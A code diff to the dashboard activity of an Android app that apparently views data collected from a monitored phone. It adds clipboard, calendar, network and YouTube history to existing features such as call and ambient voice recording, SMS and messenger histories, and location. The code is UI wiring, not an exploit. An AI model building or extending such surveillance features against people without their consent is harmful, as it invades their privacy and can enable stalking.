@@ -24,14 +24,18 @@ import java.util.List;
 import static com.scp.viewer.API.Global.GET_AMBIENT_VOICE_RECORDING;
 import static com.scp.viewer.API.Global.GET_APPLICATION_USAGE;
 import static com.scp.viewer.API.Global.GET_APP_INSTALLATION_HISTORY;
+import static com.scp.viewer.API.Global.GET_CALENDAR_HISTORY;
 import static com.scp.viewer.API.Global.GET_CALL_HISTORY;
+import static com.scp.viewer.API.Global.GET_CLIPBOARD_HISTORY;
 import static com.scp.viewer.API.Global.GET_CONTACT_HISTORY;
 import static com.scp.viewer.API.Global.GET_LOCATION_HISTORY;
+import static com.scp.viewer.API.Global.GET_NETWORK_HISTORY;
 import static com.scp.viewer.API.Global.GET_NOTES_HISTORY;
 import static com.scp.viewer.API.Global.GET_PHONE_CALL_RECORDING;
 import static com.scp.viewer.API.Global.GET_PHOTO_HISTORY;
 import static com.scp.viewer.API.Global.GET_SMS_HISTORY;
 import static com.scp.viewer.API.Global.GET_URL_HISTORY;
+import static com.scp.viewer.API.Global.GET_YOUTUBE_HISTORY;
 
 
 public class DashBoard extends AppCompatActivity {
@@ -72,22 +76,28 @@ public class DashBoard extends AppCompatActivity {
         rcl_Feature.setLayoutManager(mLayoutManager);
         featureList = new ArrayList<>();
 
-        featureList.add(new Feature(R.drawable.call_icon,getApplicationContext().getResources().getString(R.string.CALL_HISTORY),GET_CALL_HISTORY));
-        featureList.add(new Feature(R.drawable.messeage_app,getApplicationContext().getResources().getString(R.string.SMS_HISTORY),GET_SMS_HISTORY));
-        featureList.add(new Feature(R.drawable.contact_icon,getApplicationContext().getResources().getString(R.string.CONTACT_HISTORY),GET_CONTACT_HISTORY));
-        featureList.add(new Feature(R.drawable.url_browser,getApplicationContext().getResources().getString(R.string.URL_HISTORY),GET_URL_HISTORY));
-        featureList.add(new Feature(R.drawable.gps_icon,getApplicationContext().getResources().getString(R.string.LOCATION_HISTORY), GET_LOCATION_HISTORY));
-        featureList.add(new Feature(R.drawable.photo,getApplicationContext().getResources().getString(R.string.PHOTO_HISTORY),GET_PHOTO_HISTORY));
-        featureList.add(new Feature(R.drawable.phone_call_icon,getApplicationContext().getResources().getString(R.string.PHONE_CALL_RECORDING),GET_PHONE_CALL_RECORDING));
-        featureList.add(new Feature(R.drawable.voice_record_icon,getApplicationContext().getResources().getString(R.string.AMBIENT_VOICE_RECORDING),GET_AMBIENT_VOICE_RECORDING));
-        featureList.add(new Feature(R.drawable.app_usage_icon,getApplicationContext().getResources().getString(R.string.APPLICATION_USAGE),GET_APPLICATION_USAGE));
-        featureList.add(new Feature(R.drawable.app_install,getApplicationContext().getResources().getString(R.string.APPLICATION_INSTALL),GET_APP_INSTALLATION_HISTORY)); // 2021-07-12
-        featureList.add(new Feature(R.drawable.note_icon,getApplicationContext().getResources().getString(R.string.NOTES_HISTORY),GET_NOTES_HISTORY));
-        featureList.add(new Feature(R.drawable.whatsapp_icon,getApplicationContext().getResources().getString(R.string.WHATSAPP_HISTORY),GET_SMS_HISTORY));
-        featureList.add(new Feature(R.drawable.viber_icon,getApplicationContext().getResources().getString(R.string.VIBER_HISTORY),GET_SMS_HISTORY));
-        featureList.add(new Feature(R.drawable.messenger_small,getApplicationContext().getResources().getString(R.string.FACEBOOK_HISTORY),GET_SMS_HISTORY));
-        featureList.add(new Feature(R.drawable.skype_icon,getApplicationContext().getResources().getString(R.string.SKYPE_HISTORY),GET_SMS_HISTORY));
-        featureList.add(new Feature(R.drawable.hangoust,getApplicationContext().getResources().getString(R.string.HANGOUTS_HISTORY),GET_SMS_HISTORY));
+        featureList.add(new Feature(R.drawable.call_icon, getApplicationContext().getResources().getString(R.string.CALL_HISTORY), GET_CALL_HISTORY));
+        featureList.add(new Feature(R.drawable.messeage_app, getApplicationContext().getResources().getString(R.string.SMS_HISTORY), GET_SMS_HISTORY));
+        featureList.add(new Feature(R.drawable.contact_icon, getApplicationContext().getResources().getString(R.string.CONTACT_HISTORY), GET_CONTACT_HISTORY));
+        featureList.add(new Feature(R.drawable.url_browser, getApplicationContext().getResources().getString(R.string.URL_HISTORY), GET_URL_HISTORY));
+        featureList.add(new Feature(R.drawable.gps_icon, getApplicationContext().getResources().getString(R.string.LOCATION_HISTORY), GET_LOCATION_HISTORY));
+        featureList.add(new Feature(R.drawable.photo, getApplicationContext().getResources().getString(R.string.PHOTO_HISTORY), GET_PHOTO_HISTORY));
+        featureList.add(new Feature(R.drawable.phone_call_icon, getApplicationContext().getResources().getString(R.string.PHONE_CALL_RECORDING), GET_PHONE_CALL_RECORDING));
+        featureList.add(new Feature(R.drawable.voice_record_icon, getApplicationContext().getResources().getString(R.string.AMBIENT_VOICE_RECORDING), GET_AMBIENT_VOICE_RECORDING));
+        featureList.add(new Feature(R.drawable.app_usage_icon, getApplicationContext().getResources().getString(R.string.APPLICATION_USAGE), GET_APPLICATION_USAGE));
+        featureList.add(new Feature(R.drawable.app_install, getApplicationContext().getResources().getString(R.string.APPLICATION_INSTALL), GET_APP_INSTALLATION_HISTORY)); // 2021-07-12
+        featureList.add(new Feature(R.drawable.ic_clipboard, getApplicationContext().getResources().getString(R.string.CLIPBOARD_HISTORY), GET_CLIPBOARD_HISTORY));
+
+        featureList.add(new Feature(R.drawable.whatsapp_icon, getApplicationContext().getResources().getString(R.string.WHATSAPP_HISTORY), GET_SMS_HISTORY));
+        featureList.add(new Feature(R.drawable.viber_icon, getApplicationContext().getResources().getString(R.string.VIBER_HISTORY), GET_SMS_HISTORY));
+        featureList.add(new Feature(R.drawable.messenger_small, getApplicationContext().getResources().getString(R.string.FACEBOOK_HISTORY), GET_SMS_HISTORY));
+        featureList.add(new Feature(R.drawable.skype_icon, getApplicationContext().getResources().getString(R.string.SKYPE_HISTORY), GET_SMS_HISTORY));
+        featureList.add(new Feature(R.drawable.hangoust, getApplicationContext().getResources().getString(R.string.HANGOUTS_HISTORY), GET_SMS_HISTORY));
+
+        featureList.add(new Feature(R.drawable.note_icon, getApplicationContext().getResources().getString(R.string.NOTES_HISTORY), GET_NOTES_HISTORY));
+        featureList.add(new Feature(R.drawable.calendar_icon,getApplicationContext().getResources().getString(R.string.CALENDAR_HISTORY), GET_CALENDAR_HISTORY));
+        featureList.add(new Feature(R.drawable.wifi_status,getApplicationContext().getResources().getString(R.string.NETWORK_HISTORY),GET_NETWORK_HISTORY));
+        featureList.add(new Feature(R.drawable.ic_youtube, getApplicationContext().getResources().getString(R.string.YOUTUBE_HISTORY), GET_YOUTUBE_HISTORY));
 
 
         /* featureList.add(new Feature(R.drawable.instagram_icon,getApplicationContext().getResources().getString(R.string.INSTAGRAM_HISTORY),""));
